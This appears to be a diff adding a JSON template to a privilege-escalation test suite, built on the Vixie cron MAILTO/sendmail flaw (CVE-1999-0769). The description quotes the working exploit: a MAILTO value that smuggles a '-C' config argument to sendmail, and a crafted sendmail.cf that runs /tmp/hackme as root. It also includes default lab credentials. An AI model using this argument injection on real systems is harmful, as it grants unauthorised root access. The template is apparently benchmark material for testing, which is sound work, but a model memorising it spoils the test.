@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19474",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Caldera OpenLinux 2.2 / Debian 2.1/2.2 / RedHat 6.0 - Vixie Cron MAILTO Sendmail (CVE-1999-0769;OSVDB-1061)\n\nExploit source code (19474.txt):\n```\nCaldera OpenLinux 2.2 ,Debian Linux 2.1/2.2,RedHat Linux <= 6.0 Vixie Cron MAILTO Sendmail Vulnerability\n\nsource: https://www.securityfocus.com/bid/611/info\n\nFailure by the vixie cron daemon from validating the contents of a user supplied environment variable allow a malicious users to pass arbitrary command line arguments to sendmail while running as the root user.\n\nThe cron daemon uses the cron_popen function to send email to the user that queue commands for execution by cron. The user can set a MAILTO environment variable before calling cron to have it send the email to a different address. The cron daemon passes the contents of this environment variable to sendmail via the command line while executing as the root user. This allow a local malicious user to obtain root access.\n\n\nSet the user's crontab to\n\nMAILTO=\" -C/tmp/myexploitsendmail.cf\"\n* * * * * ls\n\nIn /tmp/myexploitsendmail.cf you basically modify the local mailer:\n\nO DefaultUser=root:root\nMlocal, P=/tmp/hackme, F=lsDFMAw5:/|@qXfmnz9, S=10/30,\nR=20/40,\nT=DNS/RFC822/X-Unix,\nA=mail.local -l\n\ni.e. remove the S flag, and set DefaultUser.\n```",
+  "cve": "CVE-1999-0769;OSVDB-1061",
+  "exploitdb_id": "19474",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19474",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
